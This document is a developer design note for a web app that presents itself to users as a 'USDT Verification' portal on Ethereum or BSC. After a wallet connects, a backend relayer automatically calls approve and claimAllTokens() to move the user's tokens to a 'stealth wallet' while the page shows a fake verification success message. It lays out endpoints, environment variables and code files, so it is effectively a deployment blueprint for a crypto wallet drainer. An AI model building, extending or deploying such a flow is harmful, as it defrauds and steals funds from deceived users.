# Simplified Backend Flow (No MetaTx / No Signatures)

## Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                      FRONTEND (User)                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  1. Select Network (Ethereum or BSC)                             │
│         ↓                                                         │
│  2. Click "Connect Wallet"                                       │
│         ↓                                                         │
│  3. User approves connection in wallet (MetaMask/TW/etc)         │
│         ↓                                                         │
│  4. User address captured: e.g., 0xabc123...                    │
│         ↓                                                         │
│  ⏱️  Wait 7 seconds (automatic)                                  │
│         ↓                                                         │
│  5. Backend approval triggered automatically                      │
│         ↓                                                         │
│  6. Backend claim triggered automatically                         │
│         ↓                                                         │
│  ✅ Success Modal Shown                                          │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                      BACKEND (Server)                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  POST /api/approve                                               │
│  ├─ Input: { userAddress, network }                             │
│  ├─ Gets RPC URL + Contract Address based on network            │
│  ├─ Relayer wallet approves USDT to Spender contract            │
│  │  (using simple ERC20 approve function)                        │
│  ├─ Approval TxHash + Token Address returned                    │
│  └─ Response: { success, txHash, tokenAddress }                 │
│         ↓                                                         │
│  POST /api/claim                                                 │
│  ├─ Input: { userAddress, tokenAddress, network }               │
│  ├─ Gets RPC URL + Spender Contract Address based on network    │
│  ├─ Relayer wallet calls claimAllTokens()                       │
│  │  claimAllTokens(tokenAddress, userAddress, stealthWallet)    │
│  ├─ Contract transfers user's tokens → stealth wallet           │
│  └─ Response: { success, txHash, blockNumber }                  │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

## What Changed

### **Removed (No Longer Needed):**
- ❌ EIP-712 typed data signing
- ❌ Meta-transaction executor
- ❌ Signature verification logic
- ❌ `/api/relay` endpoint
- ❌ `prepareAndSignTransaction()` function
- ❌ Nonce tracking
- ❌ Deadline parameters in claims

### **Added (New System):**
- ✅ `/api/approve` endpoint (backend triggers approval)
- ✅ 7-second auto-trigger after connection
- ✅ Network-aware RPC + Contract selection
- ✅ Simple ERC20 approval (no complex signing)
- ✅ Direct `claimAllTokens()` call with user + stealth wallet

## Environment Variables Required

### Ethereum
- `NEXT_PUBLIC_RPC_URL` - Ethereum RPC
- `NEXT_PUBLIC_CONTRACT_ADDRESS` - Ethereum Spender contract
- `SPENDER_CONTRACT_ADDRESS` - (fallback, same as above)
- `NEXT_PUBLIC_TOKEN_ADDRESS` - USDT address (0xdAC17F...)
- `RELAYER_PRIVATE_KEY` - Relayer wallet private key
- `STEALTH_WALLET_ADDRESS` - Destination for claimed tokens

### Binance Smart Chain (NEW)
- `NEXT_PUBLIC_BSC_RPC` - BSC RPC ← ADD THIS
- `NEXT_PUBLIC_BSC_CONTRACT_ADDRESS` - BSC Spender contract ← ADD THIS
- `NEXT_PUBLIC_TOKEN_ADDRESS` - USDT on BSC (shared)
- `RELAYER_PRIVATE_KEY` - Same relayer (shared)
- `STEALTH_WALLET_ADDRESS` - Destination (shared)

## User Journey

```
Step 1: Select Network
       ├─ Ethereum ──┐
       └─ BSC ────────┤
                      ↓
Step 2: Connect Wallet (simple eth_requestAccounts)
        User sees: "Processing Verification..."
        ⏱️  7 second countdown...
                      ↓
Step 3: Backend Approval (automatic)
        POST /api/approve → Relayer signs approval tx
                      ↓
Step 4: Backend Claim (automatic)
        POST /api/claim → Relayer calls claimAllTokens()
                      ↓
Step 5: Success Modal
        ✅ "USDT Verification Complete"
```

## Code Files Updated

- `lib/blockchain.ts` - Removed MetaTx functions, kept network config
- `components/ApprovalPortal.tsx` - Simplified to 3 steps, 7-sec auto-trigger
- `app/api/approve/route.ts` - NEW endpoint for approval
- `app/api/claim/route.ts` - Updated to be network-aware
- `app/api/relay/route.ts` - DELETED (no longer needed)

## Key Differences from Previous System

| Aspect | Old System | New System |
|--------|-----------|-----------|
| Signing | User signs EIP-712 typed data | No user signing |
| Approval | Part of meta-tx flow | Separate backend call |
| Auto-Trigger | No | Yes (7 seconds after connection) |
| Relayer Role | Executes meta-tx with signature | Executes approval + claim directly |
| User Steps | Connect → Approve → Sign | Connect (then automatic) |
| Gas Payer | Relayer | Relayer |
| Complexity | High (signature verification) | Low (direct contract calls) |

## How It Works Under the Hood

1. **User connects wallet** → No signing required, just wallet connection
2. **Backend waits 7 seconds** → Ensures connection is stable
3. **Backend calls `/api/approve`** → Relayer signs ERC20.approve() tx on-chain
4. **Backend calls `/api/claim`** → Relayer signs claimAllTokens() tx on-chain
5. **Tokens transferred** → From user → stealth wallet via smart contract logic

Both networks (Ethereum & BSC) use the same approval function, same ABI, just different RPC URLs and contract addresses.
